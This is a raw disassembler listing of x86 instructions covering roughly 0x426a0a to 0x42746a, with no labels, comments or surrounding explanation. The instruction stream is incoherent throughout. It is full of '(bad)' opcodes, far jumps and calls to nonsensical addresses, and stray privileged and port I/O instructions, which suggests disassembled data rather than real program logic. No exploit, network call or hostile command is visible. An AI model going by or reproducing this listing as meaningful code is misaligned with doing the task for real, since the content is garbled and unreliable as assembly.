  426a0a:	fild   WORD PTR [esp+edi*4-0x6a]
  426a0e:	mov    ds:0xf752efb0,al
  426a13:	adc    cl,BYTE PTR [esi+0x22]
  426a16:	test   al,0xa1
  426a18:	mov    dl,0x36
  426a1a:	mov    esp,0xc48d3dc2
  426a1f:	mov    cl,0x6c
  426a21:	adc    al,0xab
  426a23:	(bad)  
  426a24:	aaa    
  426a25:	sbb    eax,0x24aaadee
  426a2a:	or     DWORD PTR [edi],esi
  426a2c:	sub    BYTE PTR [ecx+0x7519ebc7],dh
  426a32:	dec    edx
  426a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a34:	add    dh,dh
  426a36:	cdq    
  426a37:	mov    eax,ds:0xabbc90b7
  426a3c:	sti    
  426a3d:	xchg   DWORD PTR [esi],eax
  426a3f:	out    dx,eax
  426a40:	mov    ebx,0x1df89c2
  426a45:	add    DWORD PTR [esi+0x7a],ebp
  426a48:	out    dx,al
  426a49:	mov    ch,0x2f
  426a4b:	gs out dx,eax
  426a4d:	mov    ebx,0x88080f08
  426a52:	xchg   edx,eax
  426a53:	retf   0x390a
  426a56:	mov    ebp,0x53bacf33
  426a5b:	inc    esi
  426a5c:	cmp    al,0xf1
  426a5e:	outs   dx,DWORD PTR ds:[esi]
  426a5f:	pop    esp
  426a60:	push   ebx
  426a61:	out    dx,eax
  426a62:	and    eax,edi
  426a64:	sahf   
  426a65:	(bad)  {k4}{z}
  426a6a:	shl    DWORD PTR [esp+edi*1+0x444d4bcf],0xcb
  426a72:	dec    ebx
  426a73:	xchg   eax,esp
  426a75:	cmp    DWORD PTR [edi],eax
  426a77:	mov    cl,0x9c
  426a79:	and    BYTE PTR [edi],0xe0
  426a7c:	pop    ebx
  426a7d:	jmp    0x4b4:0x805ec358
  426a84:	or     al,0x1b
  426a86:	fisub  DWORD PTR [edi]
  426a88:	or     BYTE PTR [ecx+0x15],0x1e
  426a8c:	sub    al,0xfb
  426a8e:	ja     0x426abc
  426a90:	mov    dh,0xf5
  426a92:	xor    al,0x54
  426a94:	push   esp
  426a95:	dec    ebx
  426a96:	call   0xe1e45fae
  426a9b:	mov    dh,0x9b
  426a9d:	fimul  WORD PTR [ecx+ecx*1+0x6e]
  426aa1:	sar    DWORD PTR [ebx],1
  426aa3:	jmp    0xa4c5:0xf2a9cbcc
  426aaa:	mov    ds:0x29490419,al
  426aaf:	data16 cmp BYTE PTR cs:[ebx-0x558a3d],cl
  426ab7:	jp     0x426a4e
  426ab9:	xor    ecx,eax
  426abb:	ins    BYTE PTR es:[edi],dx
  426abc:	pop    ds
  426abd:	rcl    DWORD PTR [ecx],0x42
  426ac0:	pop    ebx
  426ac1:	xor    DWORD PTR [edx+edx*2+0x2c],esp
  426ac5:	inc    eax
  426ac6:	jg     0x426a99
  426ac8:	and    ebx,ecx
  426aca:	clc    
  426acb:	or     edi,DWORD PTR [ebx-0x1e4c5c21]
  426ad1:	or     BYTE PTR [esi+edx*4-0x5f33ba6f],bh
  426ad8:	inc    ecx
  426ad9:	pop    edi
  426ada:	stc    
  426adb:	sub    esp,ebx
  426add:	inc    ecx
  426ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426adf:	out    dx,al
  426ae0:	neg    DWORD PTR [ebx]
  426ae2:	xchg   esp,eax
  426ae3:	sbb    esp,ecx
  426ae5:	or     bl,al
  426ae7:	sub    al,0xd4
  426ae9:	icebp  
  426aea:	adc    eax,DWORD PTR [edx-0x1e]
  426aed:	xor    al,0x0
	...
  426b53:	add    BYTE PTR [eax],al
  426b55:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426b5b:	ja     0x426b38
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0xc3
  426b63:	loop   0x426b5d
  426b65:	mov    BYTE PTR [edi-0x61],ah
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	add    BYTE PTR [ecx],al
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	cmp    cl,BYTE PTR [ebp+0x6291c29a]
  426b74:	or     edx,DWORD PTR ds:0x7c19f996
  426b7a:	pop    ecx
  426b7b:	or     ch,BYTE PTR [ebx]
  426b7d:	sbb    eax,0xbcfbcbc5
  426b82:	pop    esp
  426b83:	or     bl,BYTE PTR [ecx+0x574e07bc]
  426b89:	xor    ecx,ebp
  426b8b:	or     ah,BYTE PTR [edi-0x6c]
  426b8e:	rcr    ah,cl
  426b90:	test   eax,0xa3e9a19a
  426b95:	rep stos BYTE PTR es:[edi],al
  426b97:	imul   ebp,DWORD PTR [ecx],0xbbb0e296
  426b9d:	sti    
  426b9e:	pusha  
  426b9f:	jp     0x426bc8
  426ba1:	fucomip st,st(6)
  426ba3:	fisubr DWORD PTR [ecx]
  426ba5:	xchg   edi,eax
  426ba6:	dec    esi
  426ba7:	mov    cl,0x39
  426ba9:	retf   0xaaf8
  426bac:	das    
  426bad:	rol    cl,0x9f
  426bb0:	(bad)  [esi+0xd29b75a]
  426bb6:	ret    
  426bb7:	fcomp  st(4)
  426bb9:	inc    edi
  426bba:	ret    
  426bbb:	lahf   
  426bbc:	sti    
  426bbd:	sahf   
  426bbe:	scas   eax,DWORD PTR es:[edi]
  426bbf:	rcl    cl,cl
  426bc1:	pop    edx
  426bc2:	aaa    
  426bc3:	cli    
  426bc4:	repz xor DWORD PTR [ebp+0x27dc4482],ebx
  426bcb:	loop   0x426c18
  426bcd:	daa    
  426bce:	int3   
  426bcf:	add    al,0x6f
  426bd1:	jmp    0x52e6:0x82660de
  426bd8:	(bad)  
  426bd9:	in     eax,dx
  426bda:	dec    ecx
  426bdb:	out    dx,eax
  426bdc:	cdq    
  426bdd:	test   eax,0x63e617ad
  426be2:	ss push 0xffffffc0
  426be5:	(bad)  
  426be6:	stc    
  426be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426be8:	outs   dx,BYTE PTR ds:[esi]
  426be9:	jbe    0x426bb1
  426beb:	sub    esp,esp
  426bed:	xchg   esi,eax
  426bee:	jge    0x426bc0
  426bf0:	repnz (bad) 
  426bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bf3:	pavgw  mm5,QWORD PTR [edi]
  426bf6:	les    ecx,FWORD PTR [ebx-0x1b82d801]
  426bfc:	aad    0x91
  426bfe:	xchg   edi,eax
  426bff:	jmp    0x3f28b90f
  426c04:	push   esi
  426c05:	out    0x28,eax
  426c07:	sbb    DWORD PTR [edx+eiz*8+0x13],esp
  426c0b:	pop    ss
  426c0c:	daa    
  426c0d:	inc    ecx
  426c0e:	jmp    0x426bdd
  426c10:	and    eax,0xc6de1f0a
  426c15:	jnp    0x426bee
  426c17:	pop    edi
  426c18:	pusha  
  426c19:	into   
  426c1a:	cwde   
  426c1b:	and    DWORD PTR [esi-0x4b],esi
  426c1e:	pop    ebx
  426c1f:	rcl    BYTE PTR [ebp+0x2c82c778],cl
  426c25:	push   edx
  426c26:	inc    ecx
  426c27:	cmc    
  426c28:	je     0x426c06
  426c2a:	ret    0x5efd
  426c2d:	adc    dh,BYTE PTR [ebp-0x5c]
  426c30:	adc    eax,DWORD PTR [edi+0xe]
  426c33:	retf   
  426c34:	sub    BYTE PTR [esi+0x13],cl
  426c37:	sbb    ecx,DWORD PTR [ebp-0x19a711dd]
  426c3d:	fst    DWORD PTR [eax-0x2abd4327]
  426c43:	int    0xcb
  426c45:	pop    ss
  426c46:	pusha  
  426c47:	scas   eax,DWORD PTR es:[edi]
  426c48:	xchg   ebp,eax
  426c49:	cdq    
  426c4a:	out    0x73,eax
  426c4c:	push   eax
  426c4d:	test   eax,0x2733e747
  426c52:	mov    bl,0x60
  426c54:	push   ebp
  426c55:	sub    al,0xb5
  426c57:	cmc    
  426c58:	mov    dl,0xbc
  426c5a:	push   ds
  426c5b:	imul   edi,DWORD PTR [esi+edi*1-0x4c],0x9b073ef6
  426c63:	add    eax,eax
  426c65:	fcmove st,st(7)
  426c67:	sbb    ecx,DWORD PTR [bp-0x65]
  426c6b:	div    BYTE PTR [edx]
  426c6d:	pop    esp
	...
  426cd6:	loop   0x426d38
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xbfd8685c
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	fisttp WORD PTR ds:0x788955c7
  426cf4:	popa   
  426cf5:	mov    ds,WORD PTR [ecx-0x32]
  426cf8:	loopne 0x426ca9
  426cfa:	jne    0x426d02
  426cfc:	out    0x5d,eax
  426cfe:	cmp    DWORD PTR [ebp-0x48],ebx
  426d01:	fcomp  st(4)
  426d03:	mov    ds:0xcf62dc4,al
  426d08:	into   
  426d09:	cmp    eax,esi
  426d0b:	push   ds
  426d0c:	cmp    eax,DWORD PTR [edi]
  426d0e:	push   edi
  426d0f:	jo     0x426d76
  426d11:	shl    BYTE PTR ds:0x18003fd8,1
  426d17:	std    
  426d18:	mov    ebx,0x954e7d98
  426d1d:	inc    eax
  426d1e:	dec    esp
  426d1f:	inc    ecx
  426d20:	pop    eax
  426d21:	dec    eax
  426d22:	mov    eax,0x51f8a8cb
  426d27:	sbb    bh,bh
  426d29:	and    al,0x83
  426d2b:	lea    ecx,[esi-0x54]
  426d2e:	(bad)  gs:[ebx+0x70]
  426d32:	and    BYTE PTR [eax+0x50c00e18],al
  426d38:	cs or  edx,edi
  426d3b:	stos   WORD PTR es:[edi],ax
  426d3d:	loope  0x426cea
  426d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d40:	(bad)  
  426d41:	jmp    0xadb1c047
  426d46:	cmc    
  426d47:	nop
  426d48:	mov    bh,0x35
  426d4a:	loop   0x426da9
  426d4c:	daa    
  426d4d:	mov    al,ds:0x13b90709
  426d52:	jecxz  0x426d5c
  426d54:	stc    
  426d55:	sbb    DWORD PTR [edx-0x49759516],ebx
  426d5b:	and    BYTE PTR gs:[ecx+0x40661156],0x58
  426d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d64:	sub    eax,0x48663fcb
  426d69:	mov    ebx,0xf1bc1c84
  426d6e:	cmp    al,0xf4
  426d70:	enter  0x6b88,0x18
  426d74:	sbb    edi,DWORD PTR [ecx+0x14]
  426d77:	add    BYTE PTR [edx],ah
  426d79:	lock fucomi st,st(5)
  426d7c:	call   0x248b:0x788d0cb3
  426d83:	popf   
  426d84:	jmp    0x134989d8
  426d89:	sbb    al,0x5b
  426d8b:	iret   
  426d8c:	daa    
  426d8d:	xchg   edx,eax
  426d8e:	jno    0x426d8a
  426d90:	dec    esi
  426d91:	push   ebx
  426d92:	es or  al,0xe8
  426d95:	les    eax,FWORD PTR [ebx]
  426d97:	mov    DWORD PTR ss:[esp+ebp*1],edi
  426d9b:	ins    DWORD PTR es:[edi],dx
  426d9c:	js     0x426d6c
  426d9e:	dec    edi
  426d9f:	fnstenv [edx+0x458ca4f7]
  426da5:	jmp    0x426d6b
  426da7:	pop    es
  426da8:	(bad)  
  426da9:	mov    eax,0xc23bc921
  426dae:	push   edi
  426daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426db0:	out    dx,eax
  426db1:	push   esi
  426db2:	mov    bh,0x9e
  426db4:	in     al,0x15
  426db6:	aad    0x9
  426db8:	xor    eax,0x5c33aa0
  426dbd:	aam    0x36
  426dbf:	in     eax,dx
  426dc0:	es inc ebp
  426dc2:	pop    es
  426dc3:	xchg   cl,cl
  426dc5:	sub    DWORD PTR [eax],ebx
  426dc7:	pop    es
  426dc8:	and    BYTE PTR [edx-0x5f],bl
  426dcb:	fild   QWORD PTR [ebx+0x2f46bb96]
  426dd1:	fdivrp st(0),st
  426dd3:	pop    edx
  426dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dd5:	push   ebx
  426dd6:	inc    ebx
  426dd7:	lods   al,BYTE PTR ds:[esi]
  426dd8:	ror    DWORD PTR [edi+0x59],0x6a
  426ddc:	mov    ebx,0xef40655d
  426de1:	mov    esi,DWORD PTR [edi]
  426de3:	iret   
  426de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426de5:	lock jg 0x426ded
  426de8:	sub    edx,DWORD PTR [esi-0x284a4390]
	...
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0x3d0c:0xc7c2ecf9
  426e63:	es and BYTE PTR fs:[edi-0x5f],ah
  426e68:	add    DWORD PTR [eax],eax
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	pop    ecx
  426e6f:	dec    ecx
  426e70:	fnstenv ds:0x87c83486
  426e76:	das    
  426e77:	test   DWORD PTR [edx+0x26],eax
  426e7a:	fst    DWORD PTR [esi-0x50]
  426e7d:	dec    ebx
  426e7e:	not    BYTE PTR ds:0xd9c83ea3
  426e84:	sti    
  426e85:	(bad)
  426e88:	popf   
  426e89:	mov    ecx,0x3f875a58
  426e8e:	xchg   ebp,eax
  426e8f:	int3   
  426e90:	sbb    DWORD PTR [edi-0x64],esi
  426e93:	imul   esi,DWORD PTR [ebp+0x7a],0xffffffd6
  426e97:	imul   edi,DWORD PTR [edx],0x3a
  426e9a:	sbb    ebx,0x53165ffc
  426ea0:	call   0x37fd3593
  426ea5:	xor    eax,DWORD PTR [edi+0x3c23be7f]
  426eab:	repz call 0xca2e:0x99361389
  426eb3:	das    
  426eb4:	(bad)  
  426eb5:	popa   
  426eb6:	test   al,0x9
  426eb8:	pop    edi
  426eb9:	ret    0x3faf
  426ebc:	sbb    al,0x86
  426ebe:	aas    
  426ebf:	fcmovb st,st(7)
  426ec1:	mov    ebp,0x2dc0b5d1
  426ec6:	mov    ecx,0x5853b16
  426ecb:	sbb    edi,0x70e604ea
  426ed1:	mov    al,0x18
  426ed3:	pop    ebx
  426ed4:	and    al,0xb8
  426ed6:	shl    BYTE PTR [edi],cl
  426ed8:	cmp    esp,DWORD PTR [edi-0x46f1b77f]
  426ede:	fpatan 
  426ee0:	retf   
  426ee1:	jae    0x426f12
  426ee3:	xor    ebx,DWORD PTR ds:0xad9be6f0
  426ee9:	out    dx,al
  426eea:	fcomp  DWORD PTR [eax+0x594b944a]
  426ef0:	pop    ecx
  426ef1:	mov    al,ds:0x58b0d432
  426ef6:	inc    eax
  426ef7:	mov    ecx,gs
  426ef9:	xchg   esp,eax
  426efa:	jns    0x426f6d
  426efc:	inc    edi
  426efd:	inc    ecx
  426efe:	cmc    
  426eff:	hlt    
  426f00:	pop    ecx
  426f01:	in     al,dx
  426f02:	or     DWORD PTR [ebx],esp
  426f04:	addr16 adc al,0xc9
  426f07:	add    eax,0xd51c6705
  426f0c:	jo     0x426ef9
  426f0e:	mov    eax,0x32ecf9e1
  426f13:	retf   0xce4a
  426f16:	add    bl,BYTE PTR [esp+ebx*4-0x7ba78401]
  426f1d:	aam    0x9c
  426f1f:	and    DWORD PTR [ebp+0x6b],ecx
  426f22:	test   al,0xb3
  426f24:	rcr    BYTE PTR [ecx+0x2bba2622],0xbb
  426f2b:	jnp    0x426f10
  426f2d:	push   edi
  426f2e:	cmp    DWORD PTR ds:0xb2de3de1,0xffffffe8
  426f35:	adc    edi,DWORD PTR [esi]
  426f37:	dec    edi
  426f38:	in     al,0xd9
  426f3a:	repz idiv BYTE PTR [esi+0x27]
  426f3e:	dec    esp
  426f3f:	int3   
  426f40:	push   cs
  426f41:	sbb    ch,BYTE PTR [eax+0x4]
  426f44:	repnz not cl
  426f47:	sub    al,0x96
  426f49:	dec    edi
  426f4a:	sub    BYTE PTR [esi-0x74],ch
  426f4d:	ins    BYTE PTR es:[edi],dx
  426f4e:	mov    al,ds:0xe4415ed3
  426f53:	inc    ecx
  426f54:	fistp  DWORD PTR [ecx+0x6b]
  426f57:	xchg   DWORD PTR [ebp+esi*1+0x45e5a02b],esi
  426f5e:	es lock mov edx,0x2825c820
  426f65:	cmc    
  426f66:	(bad)  
  426f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f68:	lea    esi,[edx-0x2918a659]
	...
  426fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd7:	mov    ds:0xf5c7f1c7,al
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [edi+ebx*4+0x673453e6],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	inc    esp
  426fef:	and    ebp,DWORD PTR [ecx]
  426ff1:	aas    
  426ff2:	mov    dh,0xa6
  426ff4:	fimul  WORD PTR [ebp+ebp*4-0x44]
  426ff8:	push   0x15
  426ffa:	aam    0x8a
  426ffc:	outs   dx,BYTE PTR ds:[esi]
  426ffd:	out    dx,eax
  426ffe:	aam    0x1e
  427000:	adc    BYTE PTR [esi+0x6f],ch
  427003:	out    dx,eax
  427004:	daa    
  427005:	ds (bad) 
  427007:	xor    ebx,edi
  427009:	or     eax,0x86ba6ff1
  42700e:	arpl   WORD PTR [ebp+0x7de6228b],sp
  427014:	pop    edx
  427015:	test   BYTE PTR [ebp+0x37],0xf
  427019:	mov    dh,0xb2
  42701b:	add    al,0xc5
  42701d:	out    0xf4,al
  42701f:	xchg   esp,eax
  427020:	daa    
  427021:	(bad)  
  427022:	ds clc 
  427024:	ss xchg ebp,eax
  427026:	sbb    eax,0xf915cb84
  42702b:	les    edi,FWORD PTR [esi-0x7a1eaba6]
  427031:	cmp    eax,0x640dc2c4
  427036:	cli    
  427037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427038:	in     al,dx
  427039:	ds dec edi
  42703b:	mov    edx,0x1c79c322
  427040:	adc    ah,BYTE PTR [ecx-0x75fc2377]
  427046:	outs   dx,DWORD PTR ds:[esi]
  427047:	ret    
  427048:	mov    DWORD PTR [ecx-0x287adf86],edx
  42704e:	mov    edi,0x33a9eb9e
  427053:	and    al,0xc4
  427055:	mov    dl,0x9a
  427057:	pop    eax
  427058:	scas   eax,DWORD PTR es:[edi]
  427059:	adc    BYTE PTR [edx+0x5c],ch
  42705c:	mov    ebx,0xde322218
  427061:	xlat   BYTE PTR ds:[ebx]
  427062:	inc    DWORD PTR [edx]
  427064:	daa    
  427065:	mov    BYTE PTR [eax],dl
  427067:	jg     0x427071
  427069:	mov    eax,ds:0x6ff7ab96
  42706e:	leave  
  42706f:	add    eax,edx
  427071:	jmp    0x21634f4c
  427076:	xchg   BYTE PTR [ebp-0x5f],al
  427079:	pushf  
  42707a:	jp     0x427092
  42707c:	dec    edx
  42707d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42707e:	push   esi
  42707f:	xchg   edx,eax
  427080:	cld    
  427081:	das    
  427082:	xchg   esp,eax
  427083:	clc    
  427084:	and    BYTE PTR ds:0xf536470,0xe7
  42708b:	(bad)  
  42708c:	cmp    ebp,DWORD PTR [edi]
  42708e:	push   ss
  42708f:	xor    ah,BYTE PTR [eax+0x5b]
  427092:	push   edx
  427093:	loopne 0x427042
  427095:	fldcw  WORD PTR [eax+0x24b8d2dd]
  42709b:	or     esi,DWORD PTR [ecx+0x1af3d9ac]
  4270a1:	(bad)  
  4270a2:	and    DWORD PTR [esi+0x56],esi
  4270a5:	shl    DWORD PTR [ebx-0x28],0x36
  4270a9:	mov    bl,0x93
  4270ab:	inc    eax
  4270ac:	clc    
  4270ad:	imul   edi,eax,0xbce0a23
  4270b3:	push   edx
  4270b4:	adc    eax,0x1d9137c
  4270b9:	inc    esi
  4270ba:	addr16 into 
  4270bc:	repz arpl WORD PTR [edx],dx
  4270bf:	xlat   BYTE PTR ds:[ebx]
  4270c0:	jno    0x4270cf
  4270c2:	pop    eax
  4270c3:	ror    DWORD PTR [esi+0x5f4c5840],0x9e
  4270ca:	shl    DWORD PTR [eax-0x5d],cl
  4270cd:	lods   al,BYTE PTR ds:[esi]
  4270ce:	add    esi,DWORD PTR [ebx]
  4270d0:	pop    edi
  4270d1:	stos   BYTE PTR es:[edi],al
  4270d2:	cmc    
  4270d3:	cs cdq 
  4270d5:	sub    esi,0xffffffa2
  4270d8:	or     BYTE PTR [esi-0x7753ef12],bl
  4270de:	test   al,0x7
  4270e0:	mov    bl,0x9c
  4270e2:	imul   esp,edx,0xcd1b9db8
  4270e8:	xchg   ebx,eax
  4270e9:	aam    0x1f
  4270eb:	fbstp  TBYTE PTR [edi+0xbf]
	...
  427155:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42715c:	(bad)  
  42715d:	std    
  42715e:	inc    esp
  42715f:	mov    ebp,0x82079d96
  427164:	xor    DWORD PTR [ebp+0x1a367],esp
  42716a:	add    BYTE PTR [ecx],al
  42716c:	add    BYTE PTR [eax],al
  42716e:	and    bl,BYTE PTR ds:0x852ec2f8
  427174:	cmp    DWORD PTR [eax-0x7],esp
  427177:	jp     0x4271ef
  427179:	ret    0x33a8
  42717c:	sub    BYTE PTR [eax+0x47],0x93
  427180:	daa    
  427181:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  427183:	sbb    DWORD PTR [ebx+edx*8+0xec57c17],esi
  42718a:	hlt    
  42718b:	inc    esi
  42718c:	clc    
  42718d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42718e:	jp     0x4271f8
  427190:	or     al,0xbd
  427192:	jle    0x4271e5
  427194:	push   esi
  427195:	int3   
  427196:	fcom   QWORD PTR [ebp+ebp*2+0x16d5f118]
  42719d:	imul   ecx,DWORD PTR [edx],0x6b
  4271a0:	es inc edx
  4271a2:	lahf   
  4271a3:	aaa    
  4271a4:	jbe    0x4271b1
  4271a6:	je     0x427217
  4271a8:	mov    esp,0xf12a4299
  4271ad:	push   ss
  4271ae:	push   esi
  4271af:	adc    BYTE PTR ds:0xb2251cb6,ah
  4271b5:	push   es
  4271b6:	rol    BYTE PTR [ebp-0x28],cl
  4271b9:	test   ch,0xfd
  4271bc:	xor    al,0xb9
  4271be:	fnstenv [ebp+0x1a]
  4271c1:	mov    ds,WORD PTR [ecx+ebx*2-0x2c]
  4271c5:	cwde   
  4271c6:	push   edi
  4271c7:	inc    ecx
  4271c8:	popf   
  4271c9:	loop   0x427206
  4271cb:	clc    
  4271cc:	xchg   ebp,eax
  4271cd:	cli    
  4271ce:	inc    ebp
  4271cf:	outs   dx,DWORD PTR ds:[esi]
  4271d0:	add    eax,0x9dad033b
  4271d5:	test   eax,0x2c31e3d5
  4271da:	popf   
  4271db:	mov    cl,0x10
  4271dd:	sbb    DWORD PTR [ebp+0x27],ecx
  4271e0:	lea    edx,[ebx-0x3828a7be]
  4271e6:	add    eax,0x3b2ed1ee
  4271eb:	push   0x1cebe234
  4271f0:	mov    ch,0x8c
  4271f2:	cld    
  4271f3:	repnz pop esp
  4271f5:	hlt    
  4271f6:	test   DWORD PTR [edx-0x392586b8],edx
  4271fc:	shl    DWORD PTR [edi-0x67],1
  4271ff:	adc    eax,0x8b4bb840
  427204:	jne    0x427186
  427206:	ins    DWORD PTR es:[edi],dx
  427207:	scas   al,BYTE PTR es:[edi]
  427208:	add    DWORD PTR [esi+0x51],ebp
  42720b:	dec    edx
  42720c:	pop    esp
  42720d:	sahf   
  42720e:	xor    eax,0x610f0f3b
  427213:	and    ah,dl
  427215:	xchg   ebp,eax
  427216:	inc    esp
  427217:	mov    al,ds:0x5c4aeb39
  42721c:	mov    eax,ds:0xf56362c
  427221:	push   esp
  427222:	ret    
  427223:	mov    ah,0xe8
  427225:	aaa    
  427226:	xor    BYTE PTR [esi+0x54],0x5c
  42722a:	(bad)  
  42722b:	mov    eax,ds:0xf3c92931
  427230:	bound  esp,QWORD PTR [edx+ebp*2]
  427233:	xchg   esi,esp
  427235:	jg     0x427234
  427237:	sub    eax,DWORD PTR [ecx]
  427239:	jnp    0x4272a0
  42723b:	xchg   ebx,eax
  42723c:	lds    ebp,FWORD PTR [ebp-0x65]
  42723f:	icebp  
  427240:	cmp    al,0x93
  427242:	std    
  427243:	add    BYTE PTR [esp+ebp*8],ch
  427246:	xchg   edi,eax
  427247:	fld    DWORD PTR [esi-0x7e]
  42724a:	push   cs
  42724b:	test   ch,al
  42724d:	lds    edx,FWORD PTR [edx]
  42724f:	add    BYTE PTR [ebp+0x94df325],cl
  427255:	push   cs
  427256:	xchg   DWORD PTR [ebp-0x14],eax
  427259:	cld    
  42725a:	jo     0x4272da
  42725c:	fisub  WORD PTR [esi]
  42725e:	fprem1 
  427260:	repz cli 
  427262:	out    0x75,eax
  427264:	add    edx,edx
  427266:	push   esp
  427267:	lods   eax,DWORD PTR ds:[esi]
  427268:	fldl2e 
  42726a:	mov    edi,0xe9d5b4
	...
  4272d3:	add    BYTE PTR [eax],al
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xa5c02271,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	xor    BYTE PTR [edx-0x5102aa],ah
  4272f4:	cld    
  4272f5:	pop    es
  4272f6:	call   0xd6e:0x48d883ae
  4272fd:	stos   BYTE PTR es:[edi],al
  4272fe:	xchg   ecx,eax
  4272ff:	cli    
  427300:	mov    esp,0xce6bbac8
  427305:	push   ebx
  427306:	adc    edi,DWORD PTR [eax-0x6caf37e1]
  42730c:	int3   
  42730d:	mov    al,0x37
  42730f:	push   es
  427310:	fadd   st,st(1)
  427312:	ja     0x4272cd
  427314:	jecxz  0x4272f5
  427316:	int    0xa7
  427318:	scas   eax,DWORD PTR es:[edi]
  427319:	pop    es
  42731a:	fnstcw WORD PTR [ecx+0x5f617d70]
  427320:	mov    ebx,0xd8164337
  427325:	xchg   edi,eax
  427326:	cdq    
  427327:	pushf  
  427328:	xchg   edx,eax
  427329:	xor    al,BYTE PTR [eax]
  42732b:	sbb    DWORD PTR [esi+0x4f9a4601],esp
  427331:	in     eax,dx
  427332:	add    esp,DWORD PTR [ebx]
  427334:	xlat   BYTE PTR ds:[ebx]
  427335:	inc    esp
  427336:	push   edx
  427337:	sub    DWORD PTR [edx-0x649fa2bf],esi
  42733d:	xor    bh,BYTE PTR [ebx]
  42733f:	pop    esp
  427340:	icebp  
  427341:	outs   dx,BYTE PTR ds:[esi]
  427342:	push   eax
  427343:	or     eax,0xbaae4e2e
  427348:	fdivrp st(4),st
  42734a:	lea    edi,[eax+0x429ba6e0]
  427350:	xor    eax,0x597db78a
  427355:	das    
  427356:	iret   
  427357:	or     BYTE PTR [edi],dl
  427359:	or     eax,0x287accb0
  42735e:	enter  0xf70b,0xe6
  427362:	leave  
  427363:	popf   
  427364:	jno    0x427349
  427366:	ret    
  427367:	mov    cl,0x52
  427369:	sti    
  42736a:	add    DWORD PTR [esi],ebp
  42736c:	add    ecx,DWORD PTR [ecx+0x6c]
  42736f:	xor    dh,ch
  427371:	ret    
  427372:	inc    ebx
  427373:	mov    al,0x10
  427375:	mov    eax,ds:0xec158270
  42737a:	out    0xbb,al
  42737c:	shr    DWORD PTR [ecx+0x43ab7a8b],cl
  427382:	mov    dh,0x76
  427384:	rcl    dl,cl
  427386:	inc    edx
  427387:	pop    esi
  427388:	jmp    0xbd48:0x1efa891
  42738f:	in     eax,0xd8
  427391:	xchg   ebx,eax
  427392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427393:	repz mov al,0x8b
  427396:	pop    ds
  427397:	mov    ecx,0x4f162818
  42739c:	jl     0x4273b0
  42739e:	mov    ch,0x3
  4273a0:	fdivr  DWORD PTR [ebp+0x1]
  4273a3:	sub    al,ah
  4273a5:	lods   al,BYTE PTR ds:[esi]
  4273a6:	jmp    0x61b2558
  4273ab:	(bad)  
  4273ac:	mov    ds:0x70dfeba3,eax
  4273b1:	push   ebp
  4273b2:	addr16 dec ebx
  4273b4:	dec    ebp
  4273b5:	xchg   ecx,eax
  4273b6:	(bad)  
  4273b7:	ds mov bl,0x17
  4273ba:	xor    DWORD PTR [edx],ecx
  4273bc:	jp     0x427388
  4273be:	push   0xffffffe1
  4273c0:	test   DWORD PTR [ecx-0x3f],edx
  4273c3:	inc    edx
  4273c4:	repz inc esi
  4273c6:	int    0xeb
  4273c8:	ins    BYTE PTR es:[edi],dx
  4273c9:	out    0xbb,al
  4273cb:	int3   
  4273cc:	rcr    bh,0x36
  4273cf:	outs   dx,DWORD PTR ds:[esi]
  4273d0:	and    bh,BYTE PTR [ecx+esi*8]
  4273d3:	or     DWORD PTR [eax+0x2c],ecx
  4273d6:	out    0x86,eax
  4273d8:	stos   BYTE PTR es:[edi],al
  4273d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273da:	mov    cl,0x4d
  4273dc:	stos   DWORD PTR es:[edi],eax
  4273dd:	fwait
  4273de:	mov    ebp,0x24898ace
  4273e3:	xlat   BYTE PTR ds:[ebx]
  4273e4:	enter  0x6f53,0x9d
  4273e8:	pop    esp
  4273e9:	outs   dx,BYTE PTR ds:[esi]
  4273ea:	or     eax,0xeac39
	...
  427453:	add    BYTE PTR [eax],al
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    eax,DWORD PTR [edx+0x675d33c4]
  427467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
